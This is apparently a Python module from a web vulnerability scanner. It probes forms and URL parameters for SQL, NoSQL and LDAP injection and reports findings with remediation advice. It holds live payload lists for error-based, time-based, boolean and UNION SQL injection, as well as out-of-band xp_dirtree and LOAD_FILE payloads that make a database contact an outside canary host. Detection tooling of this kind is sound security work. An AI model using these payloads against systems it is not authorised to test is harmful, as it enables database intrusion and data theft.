import httpx
import time
import re
from typing import List
from scanner.core.scan_result import Finding, Severity
from scanner.core.crawler import CrawlResult
from scanner.utils.http import get_url_params, inject_url_param, fetch
from scanner.utils.payloads import load_payloads

ERROR_SIGNATURES = [
    "you have an error in your sql syntax", "warning: mysql",
    "unclosed quotation mark", "quoted string not properly terminated", "odbc sql server driver",
    "pg::syntaxerror", "syntax error at or near",
    "ora-01756",
    "unrecognized token", "near \"",
    "syntax error", "sql syntax",
]

_HARDCODED_ERROR = ["'", '"', "' OR '1'='1", "\" OR \"1\"=\"1", "1 AND 1=2--"]
_HARDCODED_BLIND = ["' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--", "1 AND (SELECT * FROM (SELECT(SLEEP(5)))x)--"]
_HARDCODED_UNION = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
]
_HARDCODED_BOOLEAN = [("' AND 1=1--", "' AND 1=2--")]

def _load_sqli():
    data = load_payloads("sqli")
    if not data:
        return _HARDCODED_ERROR, _HARDCODED_BLIND, _HARDCODED_UNION, _HARDCODED_BOOLEAN
    try:
        error = data.get("error_payloads") or _HARDCODED_ERROR
        blind = data.get("blind_payloads") or _HARDCODED_BLIND
        union = data.get("union_payloads") or _HARDCODED_UNION
        bool_pairs = [(p["true"], p["false"]) for p in data.get("boolean_pairs", [])] or _HARDCODED_BOOLEAN
        return error, blind, union, bool_pairs
    except (KeyError, TypeError):
        return _HARDCODED_ERROR, _HARDCODED_BLIND, _HARDCODED_UNION, _HARDCODED_BOOLEAN

ERROR_PAYLOADS, BLIND_PAYLOADS, UNION_PAYLOADS, BOOLEAN_PAYLOAD_PAIRS = _load_sqli()

NOSQL_PAYLOADS = [
    ('{"$gt": ""}', "application/json"),
    ('{"$ne": null}', "application/json"),
    ('{"$where": "1==1"}', "application/json"),
]
LDAP_PAYLOADS = ["*)(uid=*))(|(uid=*", "*)(|(password=*))", "admin)(&)"]


def test(page: CrawlResult, client: httpx.Client, oob=None) -> List[Finding]:
    findings = []
    _test_forms(page, client, findings)
    _test_url_params(page, client, findings)
    _test_nosql(page, client, findings)
    _test_ldap(page, client, findings)

    # Blind OOB SQLi payloads (MSSQL xp_dirtree, MySQL LOAD_FILE DNS exfil)
    if oob and not findings:
        canary = oob.get_canary()
        oob_payloads = [
            f"'; EXEC xp_dirtree '\\\\{canary}\\a'--",
            f"1; EXEC xp_dirtree '\\\\{canary}\\a'--",
            f"' AND LOAD_FILE('\\\\\\\\{canary}\\\\a')--",
            f"1 AND LOAD_FILE('\\\\\\\\{canary}\\\\a')--",
        ]
        from scanner.utils.http import get_url_params, inject_url_param
        params = get_url_params(page.url)
        for param_name in params:
            for payload in oob_payloads:
                try:
                    client.get(inject_url_param(page.url, param_name, payload), timeout=5)
                except Exception:
                    pass
        for form in page.forms:
            for inp in form["inputs"]:
                if not inp["name"]:
                    continue
                for payload in oob_payloads[:2]:
                    data = {i["name"]: i.get("value", "") for i in form["inputs"] if i["name"]}
                    data[inp["name"]] = payload
                    try:
                        client.request(form["method"].upper(), form["action"], data=data, timeout=5)
                    except Exception:
                        pass

    return findings


def _test_forms(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    for form in page.forms:
        input_names = [inp["name"] for inp in form["inputs"] if inp["name"]]
        if not input_names:
            continue

        # Error-based
        for payload in ERROR_PAYLOADS:
            data = {name: payload for name in input_names}
            resp = fetch(client, form["method"], form["action"], data)
            if resp:
                matched = _error_match(resp.text)
                if matched:
                    findings.append(_error_finding(form["action"], input_names[0], payload, matched))
                    break

        # Time-based blind
        for payload in BLIND_PAYLOADS:
            data = {name: payload for name in input_names}
            elapsed = _timed_fetch(client, form["method"], form["action"], data)
            if elapsed >= 4.5:
                findings.append(_blind_finding(form["action"], input_names[0], payload, elapsed))
                break


def _test_url_params(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    params = get_url_params(page.url)
    if not params:
        return

    for param_name in params:
        # Error-based
        for payload in ERROR_PAYLOADS:
            test_url = inject_url_param(page.url, param_name, payload)
            resp = fetch(client, "get", test_url)
            if resp:
                matched = _error_match(resp.text)
                if matched:
                    findings.append(_error_finding(page.url, param_name, payload, matched))
                    break

        # Time-based blind
        for payload in BLIND_PAYLOADS:
            test_url = inject_url_param(page.url, param_name, payload)
            elapsed = _timed_fetch(client, "get", test_url)
            if elapsed >= 4.5:
                findings.append(_blind_finding(page.url, param_name, payload, elapsed))
                break

        # Boolean-based blind (response length difference)
        for true_payload, false_payload in BOOLEAN_PAYLOAD_PAIRS:
            try:
                r_true = client.get(inject_url_param(page.url, param_name, true_payload))
                r_false = client.get(inject_url_param(page.url, param_name, false_payload))
                diff = abs(len(r_true.text) - len(r_false.text))
                if diff > 100 and r_true.status_code == 200 and r_false.status_code == 200:
                    findings.append(Finding(
                        title="SQL Injection (Boolean-Based Blind)",
                        severity=Severity.CRITICAL,
                        url=page.url,
                        parameter=param_name,
                        payload=true_payload,
                        evidence=f"TRUE condition returned {len(r_true.text)} bytes, FALSE returned {len(r_false.text)} bytes (diff: {diff})",
                        description="Boolean-based blind SQLi confirmed by observable response length difference between true and false conditions.",
                        remediation="Use parameterized queries. Never concatenate user input into SQL strings.",
                        cwe="CWE-89",
                        cvss=9.8,
                        owasp_category="A03:2021 Injection",
                        standards=["ISO27001-8.23", "HIPAA-164.312a", "GDPR-Art32"],
                        confidence=0.85,
                    ))
                    break
            except Exception:
                continue


def _test_nosql(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    content_type = page.headers.get("content-type", "")
    if "json" not in content_type and "javascript" not in content_type:
        return

    for payload, ct in NOSQL_PAYLOADS:
        for param_name in get_url_params(page.url):
            test_url = inject_url_param(page.url, param_name, payload)
            try:
                resp = client.get(test_url)
            except Exception:
                continue
            if resp.status_code == 200 and len(resp.text) > 10:
                findings.append(Finding(
                    title="NoSQL Injection",
                    severity=Severity.CRITICAL,
                    url=page.url,
                    parameter=param_name,
                    payload=payload,
                    evidence=f"NoSQL operator payload returned HTTP 200 with {len(resp.text)} bytes",
                    description="NoSQL injection allows attackers to bypass authentication or extract data from NoSQL databases (MongoDB, etc.).",
                    remediation="Validate and sanitize all inputs. Use typed schemas. Never pass raw user input as query operators.",
                    cwe="CWE-943",
                    cvss=9.8,
                    owasp_category="A03:2021 Injection",
                    standards=["ISO27001-8.23", "HIPAA-164.312a"],
                    confidence=0.7,
                ))
                break


def _test_ldap(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    for form in page.forms:
        input_names = [i["name"] for i in form["inputs"] if i["name"]]
        if not input_names:
            continue
        for payload in LDAP_PAYLOADS:
            data = {name: payload for name in input_names}
            resp = fetch(client, form["method"], form["action"], data)
            if resp and resp.status_code == 200 and _looks_like_ldap_bypass(resp.text):
                findings.append(Finding(
                    title="LDAP Injection",
                    severity=Severity.CRITICAL,
                    url=form["action"],
                    parameter=input_names[0],
                    payload=payload,
                    evidence="LDAP injection payload returned successful response (possible authentication bypass)",
                    description="LDAP injection allows authentication bypass or directory traversal against LDAP/Active Directory backends.",
                    remediation="Escape all special LDAP characters in user input. Use parameterized LDAP queries.",
                    cwe="CWE-90",
                    cvss=9.8,
                    owasp_category="A03:2021 Injection",
                    standards=["ISO27001-8.8", "HIPAA-164.312a"],
                    confidence=0.65,
                ))
                break


def _looks_like_ldap_bypass(body: str) -> bool:
    success_hints = ["welcome", "dashboard", "logged in", "profile", "account", "home"]
    return any(h in body.lower() for h in success_hints)


def _error_match(body: str) -> str | None:
    body_lower = body.lower()
    return next((s for s in ERROR_SIGNATURES if s in body_lower), None)


def _timed_fetch(client: httpx.Client, method: str, url: str, data: dict | None = None) -> float:
    try:
        start = time.time()
        if method == "post":
            client.post(url, data=data or {})
        else:
            client.get(url)
        return time.time() - start
    except Exception:
        return 0.0


def _error_finding(url: str, param: str, payload: str, matched: str) -> Finding:
    return Finding(
        title="SQL Injection (Error-Based)",
        severity=Severity.CRITICAL,
        url=url, parameter=param, payload=payload,
        evidence=f"Database error signature: '{matched}'",
        description="SQL injection allows attackers to read, modify, or delete database data.",
        remediation="Use parameterized queries. Never concatenate user input into SQL strings. Apply least-privilege DB accounts.",
        cwe="CWE-89", cvss=9.8,
        owasp_category="A03:2021 Injection",
        standards=["ISO27001-8.23", "HIPAA-164.312a", "GDPR-Art32", "APPI-Art20"],
        confidence=1.0,
    )


def _blind_finding(url: str, param: str, payload: str, elapsed: float) -> Finding:
    return Finding(
        title="SQL Injection (Time-Based Blind)",
        severity=Severity.CRITICAL,
        url=url, parameter=param, payload=payload,
        evidence=f"Response delayed {elapsed:.1f}s after time-based payload",
        description="Blind SQL injection confirmed via time-delay side channel.",
        remediation="Use parameterized queries. Never concatenate user input into SQL strings.",
        cwe="CWE-89", cvss=9.8,
        owasp_category="A03:2021 Injection",
        standards=["ISO27001-8.23", "HIPAA-164.312a", "GDPR-Art32"],
        confidence=1.0,
    )
